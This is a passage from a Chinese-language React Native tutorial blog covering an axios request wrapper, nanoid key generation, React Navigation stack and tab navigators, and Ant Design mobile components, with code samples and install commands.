TODO:请求失败后做点什么 throw Error(response.opt || &quot;服务异常&quot;); &#125; return response; &#125;, (error) =&gt; &#123; // TODO:对应响应失败做点什么 return Promise.resolve(error.response); &#125;);// 请求类export default class http &#123; // ES7异步get函数 static async get(url, params) &#123; try &#123; let query = await new URLSearchParams(params).toString(); let res = null; if (!params) &#123; res = await axios.get(url); &#125; else &#123; res = await axios.get(url + &quot;?&quot; + query); &#125; return res; &#125; catch (error) &#123; return error; &#125; &#125; static async post(url, params) &#123; try &#123; let res = await axios.post(url, params); return res; &#125; catch (error) &#123; return error; &#125; &#125; static async patch(url, params) &#123; try &#123; let res = await axios.patch(url, params); return res; &#125; catch (error) &#123; return error; &#125; &#125; static async put(url, params) &#123; try &#123; let res = await axios.put(url, params); return res; &#125; catch (error) &#123; return error; &#125; &#125; static async delete(url, params) &#123; /** * params默认为数组 */ try &#123; let res = await axios.post(url, params); return res; &#125; catch (error) &#123; return error; &#125; &#125;&#125; httpBaseConfig.js中的配置如下： 12345export default httpBaseConfig = &#123; baseUrl: &#x27;http://www.*****.***&#x27;, port: &#x27;****&#x27;, prefix: &#x27;/AppServer/ajax/&#x27;&#125; 最后使用时，调用请求后，我们得到的将是一个Promise对象，使用then链将其保存到状态中即可完成数据显示： 1234567891011121314151617181920handleRequest() &#123; let param = &#123; userName: &quot;mingming&quot;, classTimeId: &quot;50648&quot;, type: &quot;3&quot;, // &#x27;callback&#x27;: &#x27;ha&#x27; &#125;; http.get(&quot;teacherApp_lookNotice.do&quot;, param) .then((res) =&gt; &#123; console.log(res); let data = JSON.parse(res); this.setState(&#123; message: data.message, &#125;); console.log(data); &#125;) .catch((error) =&gt; &#123; console.log(error); &#125;);&#125; 最终打印到控制台的结果如下： 1&#123;&quot;data&quot;: &#123;&quot;author&quot;: &quot;明茗&quot;, &quot;content&quot;: &quot;这是一个测试通知测试通知测试通知测试通知测试通知测试通知,测试***功等等，还有***，和大***等等&quot;, &quot;isAuthor&quot;: true, &quot;isUpdate&quot;: false, &quot;noReadNum&quot;: 53, &quot;noreadList&quot;: [&quot;索夏利&quot;, &quot;何一繁&quot;, &quot;段莹&quot;, &quot; 孙亮亮&quot;, &quot;李冯石&quot;, &quot;贺玉婷&quot;, &quot;张立新&quot;, &quot;龚夏萌&quot;, &quot;刘驰誉&quot;, &quot;王玲&quot;, &quot;张俊&quot;, &quot;王楠&quot;, &quot;姜克杰&quot;, &quot;孙丽园&quot;, &quot;李波&quot;, &quot;代麦玲&quot;, &quot;李妮&quot;, &quot;李坤江&quot;, &quot;李杰&quot;, &quot;黄运科&quot;, &quot;陈雨菲&quot;, &quot;黄萍&quot;, &quot;王致远&quot;, &quot;李杰&quot;, &quot;柯团团&quot;, &quot;陈雯慧&quot;, &quot;彭思毅&quot;, &quot;张昌&quot;, &quot;段怡欣&quot;, &quot;管雅&quot;, &quot;严彤鑫&quot;, &quot;徐文莉&quot;, &quot;朱景洲&quot;, &quot;刘乔瑞&quot;, &quot;王子豪&quot;, &quot;孙红&quot;, &quot;赵美婷&quot;, &quot;李雕坛&quot;, &quot;黄楠&quot;, &quot;张静静&quot;, &quot;刘祎璠&quot;, &quot;冯健强&quot;, &quot;王俊杰&quot;, &quot;张辉&quot;, &quot;彭诗雨&quot;, &quot;叶刚&quot;, &quot;何萍&quot;, &quot;何健&quot;, &quot;王锦婷&quot;, &quot;周骏&quot;, &quot;杨千骏&quot;, &quot;李娇&quot;, &quot;郭聪聪&quot;], &quot;num&quot;: 60, &quot;readList&quot;: [&quot;李龙龙&quot;, &quot;杨文选&quot;, &quot;刘佳璇&quot;, &quot;方建辉&quot;, &quot;卢文静&quot;, &quot;左亚东&quot;, &quot;李盈斌&quot;], &quot;readNum&quot;: 7, &quot;title&quot;: &quot;测试通知&quot;&#125;, &quot;message&quot;: &quot;数据保存成功！&quot;, &quot;success&quot;: true&#125; RN使用nanoid生成key react强调组件式开发，因此有时我们可能会碰到如下情况： 一个同样的组件需要多次渲染 例如我所模拟的IOS计算器中，将所有按钮抽象为一个组件，通过传入按钮类型，大小，事件来区分他们，并以矩阵的形式对他们进行渲染。 首先对于这样的布局渲染，在JS中可以很轻松的使用map实现： 123456789101112131415buttonsRender = () =&gt; &#123; const buttons = this.state.buttons; return buttons.map((row) =&gt; &#123; return row.map((button) =&gt; &#123; return ( &lt;ButtonBasic type=&#123;button.type&#125; buttonSize=&#123;button.size&#125; label=&#123;button.label&#125; onClick=&#123;this.handleClick&#125; /&gt; ); &#125;); &#125;);&#125;; 但此时，发出如下警告： 1Warning: Each child in a list should have a unique &quot;key&quot; prop. See https://reactjs.org/link/warning-keys for more information. 旨在告诉我们list中每一个需要渲染的JSX都应该具有一个独立的key属性，这是因为React会依照这一属性来决定该JSX的渲染。因此，如果没有key属性，React可能将无法对于list中元素的位置变化等操作做出正确的渲染。 在纯React我们通常会使用nanoid这一第三方库利用伪随机，来生成一个独立的key： 12345678910111213141516buttonsRender = () =&gt; &#123; const buttons = this.state.buttons; return buttons.map((row) =&gt; &#123; return row.map((button) =&gt; &#123; return ( &lt;ButtonBasic key=&#123;nanoid()&#125; type=&#123;button.type&#125; buttonSize=&#123;button.size&#125; label=&#123;button.label&#125; onClick=&#123;this.handleClick&#125; /&gt; ); &#125;); &#125;);&#125;; 但如果我们直接将这一库应用到RN应用中，将会获得如下报错： 1Error: Requiring module &quot;node_modules\\nanoid\\index.browser.js&quot;, which threw an exception: Error: React Native does not have a built-in secure random generator. If you don’t need unpredictable IDs use `nanoid/non-secure`. For secure IDs, import `react-native-get-random-values` before Nano ID. 可见RN并不像浏览器DOM那样提供随机数生成内联函数，因此他推荐的做法有如下两种： 使用nanoid/non-secure代替，即使用非随机ID代替 在nanoid前手动引入随机数生成器：react-native-get-random-values 如上两种方法在stackOverflow中均有人使用并调试成功，具体可见：Nanoid can’t be used in react-native - Stack Overflow 我们使用第二种方式。由于本项目中所有的组件都由App组件统一渲染，因此只需在App.js中引入随机数函数即可，但这样会导致额外的依赖，因此还是推荐哪里用到nano，哪里再引入该组件： 1234567891011import &quot;react-native-get-random-values&quot;;import React, &#123; Component, useState &#125; from &quot;react&quot;;import Calculator from &quot;./src/component/Calculator&quot;;class App extends Component &#123; render() &#123; return &lt;Calculator /&gt;; &#125;&#125;export default App; React-Navigation React-Native在0.44版本后，取消了Navigator组件，该组件曾负责RN中的路由。因此，在之后的RN版本中，官方推荐使用第三方路由组件：React Navigation 该组件提供了三种基本路由方式： StackNavigation TabNavigation DrawerNavigation 安装 使用该第三方组件实现路由时，首先安装该组件库： 1$ yarn add @react-navigation/native 然后安装同级依赖： 1$ yarn add react-native-screens react-native-safe-area-context NavigationContainer 该组件负责组织app中的路由，将顶级路由链接到app环境中。一般情况下，一个APP只有一个，使用时通常使用该组件将App中的组件包裹，如下所示： 1234567891011121314151617181920import React, &#123; Component &#125; from &quot;react&quot;;import &#123; SafeAreaView, View &#125; from &quot;react-native&quot;;import MainNavigation from &quot;./src/Components/Navigation/MainNavigation&quot;;import MyTabBar from &quot;./src/Components/Navigation/TabBar&quot;;import &quot;react-native-get-random-values&quot;;import &#123; NavigationContainer, navigationRef &#125; from &quot;@react-navigation/native&quot;;export default class App extends Component &#123; constructor(props) &#123; super(props); &#125; render() &#123; return ( &lt;NavigationContainer&gt; &lt;MyTabBar /&gt; &lt;/NavigationContainer&gt; ); &#125;&#125; Ref 还可以通过ref的方式获取到NavigationContainer实例，从而调用其中的API，除了使用React提供的React.useRef和React.createRef外，还能使用React-Navigtaion为我们提供的API： 1234567891011121314import &#123; NavigationContainer, useNavigationContainerRef &#125; from &#x27;@react-navigation/native&#x27;;function App() &#123; const navigationRef = useNavigationContainerRef(); // You can also use a regular ref with `React.useRef()` return ( &lt;View style=&#123;&#123; flex: 1 &#125;&#125;&gt; &lt;Button onPress=&#123;() =&gt; navigationRef.navigate(&#x27;Home&#x27;)&#125;&gt; Go home &lt;/Button&gt; &lt;NavigationContainer ref=&#123;navigationRef&#125;&gt;&#123;/* ... */&#125;&lt;/NavigationContainer&gt; &lt;/View&gt; );&#125; 但当我们使用React提供的方法来创建Ref时，在一些情况下Ref对象的初始值将被初始化为null，因此需要使用onReady回调函数来等到navigationContainer挂载结束再创建Ref对象。 实例对象将包含一些通用的方法，具体可查阅：docs for CommonActions Props 此外，该组件还提供一些参数可供选择： initialState用于设置初始状态 onStateChange每次navigation state改变时都将调用该函数。 onReady每次navigationContainer和其所有子组件均挂载完后调用，常用于在此确保ref对象时可用的。 Screen Screen组件用于控制导航内部各个页面的配置，需要通过调用CreateXNavigator函数得到： 1const Stack = createNativeStackNavigator() 创建好navigator后使用如下方法即可组织路由： 1234&lt;Stack.Navigator&gt; &lt;Stack.Screen name=&quot;Home&quot; component=&#123;HomeScreen&#125; /&gt; &lt;Stack.Screen name=&quot;Profile&quot; component=&#123;ProfileScreen&#125; /&gt;&lt;/Stack.Navigator&gt; 每个Screen组件必须包含一个name属性与一个component属性，name属性用于唯一的标识一个组件，并且该name将用于后续跳转页面： 1navigation.navigate(&#x27;Profile&#x27;); 需要注意的是官网推荐避免使用空格和特殊符号作为name。 options 该参数用于配置该页组件的表现形式，可接受一个对象或一个函数： 1234567&lt;Stack.Screen name=&quot;Profile&quot; component=&#123;ProfileScreen&#125; options=&#123;&#123; title: &#x27;Awesome app&#x27;, &#125;&#125;/&gt; 可以通过函数接收route或navigation参数，可使用route获取其他页面传来的参数或使用navigation进行一些路由操作。 1234567&lt;Stack.Screen name=&quot;Profile&quot; component=&#123;ProfileScreen&#125; options=&#123;(&#123; route, navigation &#125;) =&gt; (&#123; title: route.params.userId, &#125;)&#125;/&gt; initialParams 初始化参数，让将一个页面使用initialRouteName设为默认页面后，将为为该页面传递initialRouteName中的参数。当从新跳转到该页面后，新传入的参数将与initialParams中的参数进行浅合并（shallow merge）： 12345&lt;Stack.Screen name=&quot;Details&quot; component=&#123;DetailsScreen&#125; initialParams=&#123;&#123; itemId: 42 &#125;&#125;/&gt; 如果需要进行深合并，请使用下文提到的方法： (39条消息) 如何深层合并而不是浅层合并？_xfxf996的博客-CSDN博客 component 用于在该路由页渲染的组件： 1&lt;Stack.Screen name=&quot;Profile&quot; component=&#123;ProfileScreen&#125; /&gt; getComponent 使用回调函数的方式渲染组件，该方法通常用于组件的懒加载，能够一定程度上提升性能，用法如下： 1234&lt;Stack.Screen name=&quot;Profile&quot; getComponent=&#123;() =&gt; require(&#x27;./ProfileScreen&#x27;).default&#125;/&gt; navigationKey 该属性用于控制不同条件下组件的显示，例如不登陆和登录时显示不同的组件，在Stack Navigator中，当条件改变时，使用该名字的组件将被移除。在Tab或Drawer Navigator中使用该名字的组件将被重置，使用方法如下： 12345&lt;Stack.Screen navigationKey=&#123;isSignedIn ? &#x27;user&#x27; : &#x27;guest&#x27;&#125; name=&quot;Profile&quot; component=&#123;ProfileScreen&#125;/&gt; Route prop 每一个Screen组件都将被自动的提供route prop，该参数主要包含被其他路由页传递到当前页面的参数。当使用函数组件时需要通过如下方式访问： 12345678function ProfileScreen(&#123; route &#125;) &#123; return ( &lt;View&gt; &lt;Text&gt;This is the profile screen of the app&lt;/Text&gt; &lt;Text&gt;&#123;route.name&#125;&lt;/Text&gt; &lt;/View&gt; );&#125; 当使用类组件时可直接通过组件的props得到： 123456789101112131415161718192021export default class Details extends Component &#123; constructor(props) &#123; super(props); this.state = &#123;&#125;; &#125; render() &#123; const routeParams = this.props.route.params; console.log(this.props.route.params?.post); const item = routeParams.article; // console.log(item); return ( &lt;View&gt; &lt;View style=&#123;styles.container&#125;&gt; &lt;Text style=&#123;styles.title&#125;&gt;&#123;item.value.name&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt;&#123;item.value.description&#125;&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; ); &#125;&#125; Navigation prop 该参数同样会被自动的提供，使用方法同route props，其中包含许多方法用于路由动作，例如如下函数： navigation navigate - 跳转到指定screen reset - 擦除导航器状态并将其替换为新路线 goBack - 关闭当前screen，返回到路由栈的上一个screen setParams - 变更route参数 setOptions - 变更screen 的 option参数 isFocused - 检查当前screen是否聚焦 addListener - 订阅路由事件更新 setParams/setOptions等应该在useEffect/useLayoutEffect/componentDidMount/componentDidUpdate等生命周期中调用，不应再渲染或构造的过程中调用。 但需要注意的是Navigation并不会自动的向下传递，它只会被传递到被screen指定的第一层组件，其子组件中将访问不到navigation，如果希望再所有组件中都能访问navigation，则需要使用useNavigaion钩子函数。 特殊参数 navigation中也包含一些需要配合特定路由使用的方法： stack navigator navigation.replace - 将当前层级screen替换为新的 navigation.push - 向路由栈中添加一个新的screen navigation.pop - 返回栈中上一级screen navigation.popToTop - 返回栈顶 Tab navigator navigation.jumpTo - 跳转到tab navigator中的特定screen drawer navigator navigation.jumpTo - 跳转到drawer navigator中的特定screen navigation.openDrawer - 打开抽屉 navigation.closeDrawer - 关闭抽屉 navigation.toggleDrawer - 转换抽屉的开关状态 StackNavigation 接下来我们尝试StackNavigation： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * Sample React Native App * https://github.com/facebook/react-native * * @format * @flow strict-local */import React from &quot;react&quot;;import Calculator from &quot;./src/component/Calculator/Calculator&quot;;import &quot;react-native-get-random-values&quot;;import &#123; SafeAreaView, ScrollView, StatusBar, StyleSheet, Text, useColorScheme, View,&#125; from &quot;react-native&quot;;// In App.js in a new projectimport &#123; NavigationContainer &#125; from &quot;@react-navigation/native&quot;;import &#123; createNativeStackNavigator &#125; from &quot;@react-navigation/native-stack&quot;;function HomeScreen() &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &quot;center&quot;, justifyContent: &quot;center&quot; &#125;&#125; &gt; &lt;Text&gt;Home Screen&lt;/Text&gt; &lt;/View&gt; );&#125;const Stack = createNativeStackNavigator();function App() &#123; return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator&gt; &lt;Stack.Screen name=&quot;Home&quot; component=&#123;HomeScreen&#125; /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );&#125;export default App;// const App = () =&gt; &#123;// return &lt;Calculator /&gt;;// &#125;;// export default App; 但此时webpak提示我们缺少依赖：react-native-safe-area-context 让我们安装该依赖： 1$ yarn add react-native-safe-area-context 再次启动仪式我们缺少另一个依赖：react-native-screens 于是安装该依赖： 1$ yarn add react-native-screens 再次启动项目，由于该依赖较大，安装时间将会显著加长。 启动后便能得到如下画面： 此时我们得到了一个页面，原因是我们只在代码中注册了一个页面，那么接下来我们添加第二个页面： 123456789101112131415161718function DetailsScreen() &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &#x27;center&#x27;, justifyContent: &#x27;center&#x27; &#125;&#125;&gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;/View&gt; );&#125;function App() &#123; return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator initialRouteName=&quot;Home&quot;&gt; &lt;Stack.Screen name=&quot;Home&quot; component=&#123;HomeScreen&#125; /&gt; &lt;Stack.Screen name=&quot;Details&quot; component=&#123;DetailsScreen&#125; /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );&#125; 使用Screen组件即可方便地排列多个页面，该组件接收一个name参数用以区分各页面，component参数用于指定页面需要渲染的组件，通过设置Navigator组件的initialRouteName参数即可设置初始显示的页面。 我们还可以通过传入options参数，设置Screen组件的一些特性，例如标题： 1234567891011121314function App() &#123; return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator initialRouteName=&quot;Home&quot;&gt; &lt;Stack.Screen name=&quot;Home&quot; component=&#123;HomeScreen&#125; options=&#123;&#123; title: &quot;Overview&quot; &#125;&#125; /&gt; &lt;Stack.Screen name=&quot;Details&quot; component=&#123;DetailsScreen&#125; /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );&#125; 如果我们希望为所有navigator中的screen组件均设置某个属性，可以通过navigator的screenOptions参数进行。 有时我们能可能跟希望使用Screen所渲染的组件，例如HomeScreen向Screen传递一些参数，那么就和父子组件通讯一样即可，使用React context或回调函数均可，使用回调函数操作如下： 123&lt;Stack.Screen name=&quot;Home&quot;&gt; &#123;props =&gt; &lt;HomeScreen &#123;...props&#125; extraData=&#123;someData&#125; /&gt;&#125;&lt;/Stack.Screen&gt; 现在我们两个页面准备好了，于是便可以通过按钮来实现跳转，Stack Navigation中通过向每个Screen组件传入参数navigation来进行跳转操作，调用navigation参数中的navigate方法来指定需要跳转到的Screen，navigator会通过比对当前screen的name与将要跳转的name来决定是否进行跳转，如下例子中在Home页面点击将发生跳转，而Deatils界面点击将没有任何反应： 123456789101112131415161718192021222324252627function HomeScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &quot;center&quot;, justifyContent: &quot;center&quot; &#125;&#125; &gt; &lt;Text&gt;Home Screen&lt;/Text&gt; &lt;Button title=&quot;Go to Details&quot; onPress=&#123;() =&gt; navigation.navigate(&quot;Details&quot;)&#125; &gt;&lt;/Button&gt; &lt;/View&gt; );&#125;function DetailsScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &quot;center&quot;, justifyContent: &quot;center&quot; &#125;&#125; &gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;Button title=&quot;Go to Details... again&quot; onPress=&#123;() =&gt; navigation.navigate(&quot;Details&quot;)&#125; /&gt; &lt;/View&gt; );&#125; 如果我们希望进入同一个页面多次，那么可以使用push方法代替navigat方法，即： 1234&lt;Button title=&quot;Go to Details... again&quot; onPress=&#123;() =&gt; navigation.push(&#x27;Details&#x27;)&#125;/&gt; 此外，navigation还提供了goBack()方法用于返回上一级 12345678910111213function DetailsScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &#x27;center&#x27;, justifyContent: &#x27;center&#x27; &#125;&#125;&gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;Button title=&quot;Go to Details... again&quot; onPress=&#123;() =&gt; navigation.push(&#x27;Details&#x27;)&#125; /&gt; &lt;Button title=&quot;Go to Home&quot; onPress=&#123;() =&gt; navigation.navigate(&#x27;Home&#x27;)&#125; /&gt; &lt;Button title=&quot;Go back&quot; onPress=&#123;() =&gt; navigation.goBack()&#125; /&gt; &lt;/View&gt; );&#125; 如果进入了太深的层级，一次一次点显然不合逻辑，此时可以使用navigate(‘Home’)直接回到首页，或是通过popToTop()方法回到深度为1的页。 1234567891011121314151617function DetailsScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &#x27;center&#x27;, justifyContent: &#x27;center&#x27; &#125;&#125;&gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;Button title=&quot;Go to Details... again&quot; onPress=&#123;() =&gt; navigation.push(&#x27;Details&#x27;)&#125; /&gt; &lt;Button title=&quot;Go to Home&quot; onPress=&#123;() =&gt; navigation.navigate(&#x27;Home&#x27;)&#125; /&gt; &lt;Button title=&quot;Go back&quot; onPress=&#123;() =&gt; navigation.goBack()&#125; /&gt; &lt;Button title=&quot;Go back to first screen in stack&quot; onPress=&#123;() =&gt; navigation.popToTop()&#125; /&gt; &lt;/View&gt; );&#125; TabNavigation tabNavigation的使用与StackNavigation类似,此处介绍Bottom-Tab的使用： 先后先安装Bottom-Tab组件： 1$ yarn add @react-navigation/bottom-tabs 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108/** * Sample React Native App * https://github.com/facebook/react-native * * @format * @flow strict-local */import React from &quot;react&quot;;import Calculator from &quot;./src/component/Calculator/Calculator&quot;;import &quot;react-native-get-random-values&quot;;import &#123; Button, SafeAreaView, ScrollView, StatusBar, StyleSheet, Text, useColorScheme, View,&#125; from &quot;react-native&quot;;// In App.js in a new projectimport &#123; NavigationContainer &#125; from &quot;@react-navigation/native&quot;;import &#123; createBottomTabNavigator &#125; from &quot;@react-navigation/bottom-tabs&quot;;import Ionicons from &quot;react-native-vector-icons/Ionicons&quot;;function HomeScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &quot;center&quot;, justifyContent: &quot;center&quot; &#125;&#125; &gt; &lt;Text&gt;Home Screen&lt;/Text&gt; &lt;Button title=&quot;Go to Details&quot; onPress=&#123;() =&gt; navigation.navigate(&quot;Details&quot;)&#125; &gt;&lt;/Button&gt; &lt;/View&gt; );&#125;function DetailsScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &quot;center&quot;, justifyContent: &quot;center&quot; &#125;&#125; &gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;Button title=&quot;Go back&quot; onPress=&#123;() =&gt; navigation.goBack()&#125; /&gt; &lt;/View&gt; );&#125;function SettingsScreen(&#123; navigation &#125;) &#123; return ( &lt;View style=&#123;&#123; flex: 1, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot; &#125;&#125; &gt; &lt;Text&gt;Setting Screen&lt;/Text&gt; &lt;/View&gt; );&#125;const Tab = createBottomTabNavigator();function App() &#123; return ( &lt;NavigationContainer&gt; &lt;Tab.Navigator initialRouteName=&quot;Home&quot; screenOption=&#123;(&#123; route &#125;) =&gt; (&#123; tabBarIcon: (&#123; focus, color, size &#125;) =&gt; &#123; let iconName; if (route.name === &quot;Home&quot;) &#123; iconName = focused ? &quot;ios-information-circle&quot; : &quot;ios-information-circle-outline&quot;; &#125; else if (route.name === &quot;Settings&quot;) &#123; iconName = focused ? &quot;ios-list-box&quot; : &quot;ios-list&quot;; &#125; else if (route.name === &quot;Details&quot;) &#123; iconName = focused ? &quot;ios-list-box&quot; : &quot;ios-list&quot;; &#125; return ( &lt;Ionicons name=&#123;iconName&#125; size=&#123;size&#125; color=&#123;color&#125; /&gt; ); &#125;, tabBarActiveTintColor: &quot;tomato&quot;, tabBarInactiveTintColor: &quot;gray&quot;, &#125;)&#125; &gt; &lt;Tab.Screen name=&quot;Home&quot; component=&#123;HomeScreen&#125; /&gt; &lt;Tab.Screen name=&quot;Details&quot; component=&#123;DetailsScreen&#125; /&gt; &lt;Tab.Screen name=&quot;Settings&quot; component=&#123;SettingsScreen&#125; /&gt; &lt;/Tab.Navigator&gt; &lt;/NavigationContainer&gt; );&#125;export default App;// const App = () =&gt; &#123;// return &lt;Calculator /&gt;;// &#125;;// export default App; 结合一些图标库，例如react-native-vector-icons可以通过Navigator的screenOptions参数或者Screen组件的Options参数为每个tab设置对应图标和显示效果，但此处图标的显示仍然在研究。 组件还为我们提供了很多有意思的选项设置，例如通知气泡： 12345&lt;Tab.Screen name=&quot;Home&quot; component=&#123;HomeScreen&#125; options=&#123;&#123; tabBarBadge: 3 &#125;&#125;/&gt; 最终效果如下： Antd-Mobile-rn 由阿里开发的适用于RN项目的UI组件库，Ant Design的RN版本，使用如下命令进行安装： 1$ yarn add @ant-design/react-native 安装完成后，使用如下命令下载并链接字体与图标库： 12$ yarn add @ant-design/icons-react-native$ react-native link @ant-design/icons-react-native 按需加载 使用 babel-plugin-import可实现按需加载。 使用如下命令安装该组件： 1$ yarn add babel-plugin-import 然后在项目根目录中添加文件.babelrc，内容如下： 123456// .babelrc&#123; &quot;plugins&quot;: [ [&quot;import&quot;, &#123; libraryName: &quot;@ant-design/react-native&quot; &#125;] // 与 Web 平台的区别是不需要设置 style ]&#125; 然后就能直接使用如下方式引入模块： 1import &#123; Button &#125; from &#x27;@ant-design/react-native&#x27;; 下面来尝试写一个带有Toast的点击事件： 123456789101112131415import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; AppRegistry &#125; from &#x27;react-native&#x27;;import &#123; Button, Provider, Toast &#125; from &#x27;@ant-design/react-native&#x27;;class HelloWorldApp extends Component &#123; render() &#123; return ( &lt;Provider&gt; &lt;Button onPress=&#123;() =&gt; Toast.info(&#x27;This is a toast tips&#x27;)&#125;&gt; Start &lt;/Button&gt; &lt;/Provider&gt; ); &#125;&#125; 使用Toast组件将会需要如下依赖： react-native-pager-view react-native-gesture-handler @react-native-community/slider @react-native-community/segmented-control @react-native-community/cameraroll fbjs Navigation TabBar antd同样提供了三种导航方式，但使用起来比React-Navigation更符合直觉，只需要使用导航组件将想要在该页显示的内容包裹起来即可，例如我们可以使用如下方式定义一个TabBar，并将我们之前写过的内容放进去： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import React from &quot;react&quot;;import &#123; Text, View &#125; from &quot;react-native&quot;;import &#123; Icon, SearchBar, TabBar &#125; from &quot;@ant-design/react-native&quot;;import Calculator from &quot;../Calculator/Calculator&quot;;import BasicTabsExample from &quot;./AntNavigator&quot;;import PopoverExample from &quot;./PopOver&quot;;import BasicPaginationExample from &quot;./Pagination&quot;;export default class BasicTabBarExample extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; selectedTab: &quot;redTab&quot;, &#125;; &#125; renderContent = (pageText) =&gt; &#123; return ( &lt;View style=&#123;&#123; flex: 1, alignItems: &quot;center&quot;, backgroundColor: &quot;white&quot;, &#125;&#125; &gt; &lt;Text style=&#123;&#123; margin: 50 &#125;&#125;&gt;&#123;pageText&#125;&lt;/Text&gt; &lt;/View&gt; ); &#125;; onChangeTab = (tabName) =&gt; &#123; this.setState(&#123; selectedTab: tabName, &#125;); &#125;; render() &#123; return ( &lt;TabBar unselectedTintColor=&quot;#949494&quot; tintColor=&quot;#33A3F4&quot; barTintColor=&quot;#f5f5f5&quot; &gt; &lt;TabBar.Item title=&quot;Home&quot; icon=&#123;&lt;Icon name=&quot;home&quot; /&gt;&#125; selected=&#123;this.state.selectedTab === &quot;blueTab&quot;&#125; onPress=&#123;(e) =&gt; this.onChangeTab(&quot;blueTab&quot;)&#125; &gt; &lt;Calculator /&gt; &lt;/TabBar.Item&gt; &lt;TabBar.Item icon=&#123;&lt;Icon name=&quot;ordered-list&quot; /&gt;&#125; title=&quot;Todo&quot; badge=&#123;2&#125; selected=&#123;this.state.selectedTab === &quot;redTab&quot;&#125; onPress=&#123;() =&gt; this.onChangeTab(&quot;redTab&quot;)&#125; &gt; &lt;BasicPaginationExample /&gt; &lt;/TabBar.Item&gt; &lt;TabBar.Item icon=&#123;&lt;Icon name=&quot;like&quot; /&gt;&#125; title=&quot;Friend&quot; selected=&#123;this.state.selectedTab === &quot;greenTab&quot;&#125; onPress=&#123;() =&gt; this.onChangeTab(&quot;greenTab&quot;)&#125; &gt; &lt;SearchBar placeholder=&quot;Search&quot; showCancelButton /&gt; &lt;BasicTabsExample /&gt; &lt;/TabBar.Item&gt; &lt;TabBar.Item icon=&#123;&lt;Icon name=&quot;user&quot; /&gt;&#125; title=&quot;My&quot; selected=&#123;this.state.selectedTab === &quot;yellowTab&quot;&#125; onPress=&#123;() =&gt; this.onChangeTab(&quot;yellowTab&quot;)&#125; &gt; &lt;PopoverExample /&gt; &lt;/TabBar.Item&gt; &lt;/TabBar&gt; ); &#125;&#125; 其中TabBar组件用于渲染整个TabBar条，其中TabBar.Item组件用于单独渲染bar上该页面的图标、颜色、名称等信息，我们只需要将页面组件，例如Calculator、BasicTabsExample等包裹在想要渲染的页面的TabBar.Item下即可。 还可以使用受控组件的形式来控制tabBar，例如上述代码中通过修改selectedTab状态来控制选中图标的颜色，只需要设置TabBar.Item中的selected属性即可，此外TabBar.Item还有其他属性可供使用，具体参见下表： TabBar.Item 属性 说明 类型 默认值 badge 徽标数 Number \\ String 无 onPress bar 点击触发，需要自己改变组件 state &amp; selecte={true} Function ()&#123;&#125; selected 是否选中 Boolean false icon 默认展示图片 `Image Source React.ReactNode` selectedIcon 选中后的展示图片 `Image Source React.ReactNode` title 标题文字 String key 唯一标识 String 无 iconStyle icon 样式 String { width: 28, height: 28 } TabBar 属性 说明 类型 默认值 barTintColor tabbar 背景色 String white tintColor 选中的字体颜色 String #108ee9 unselectedTintColor 未选中的字体颜色 String ‘#888’ Tabs antd直接为我们提供了方便使用的顶部导航可供使用，无需通过修改TabBar实现，并且使用起来和TabBar一样方便。 例如下面的代码中设计了一个较长Tab用于显示State中的所有Tab栏，只需要向Tabs组件的tabs传参即可完成自动渲染，在每一个Tab中，又渲染了8个View包裹的文本，并赋予不同的key值： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import React from &quot;react&quot;;import &#123; ScrollView, Text, View, TouchableOpacity, StyleSheet,&#125; from &quot;react-native&quot;;import &#123; Tabs &#125; from &quot;@ant-design/react-native&quot;;export default class BasicTabsExample extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; tab: [ &#123; title: &quot;1st Tab&quot; &#125;, &#123; title: &quot;2nd Tab&quot; &#125;, &#123; title: &quot;3rd Tab&quot; &#125;, &#123; title: &quot;4th Tab&quot; &#125;, &#123; title: &quot;5th Tab&quot; &#125;, &#123; title: &quot;6th Tab&quot; &#125;, &#123; title: &quot;7th Tab&quot; &#125;, &#123; title: &quot;8th Tab&quot; &#125;, &#123; title: &quot;9th Tab&quot; &#125;, ], &#125;; &#125; renderContent = (tab, index) =&gt; &#123; const style = &#123; paddingVertical: 40, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, margin: 10, backgroundColor: &quot;#ddd&quot;, &#125;; const content = [1, 2, 3, 4, 5, 6, 7, 8].map((i) =&gt; &#123; return ( &lt;View key=&#123;`$&#123;index&#125;_$&#123;i&#125;`&#125; style=&#123;style&#125;&gt; &lt;Text&gt; &#123;tab.title&#125; - &#123;i&#125; &lt;/Text&gt; &lt;/View&gt; ); &#125;); return ( &lt;ScrollView style=&#123;&#123; backgroundColor: &quot;#fff&quot; &#125;&#125;&gt; &#123;content&#125; 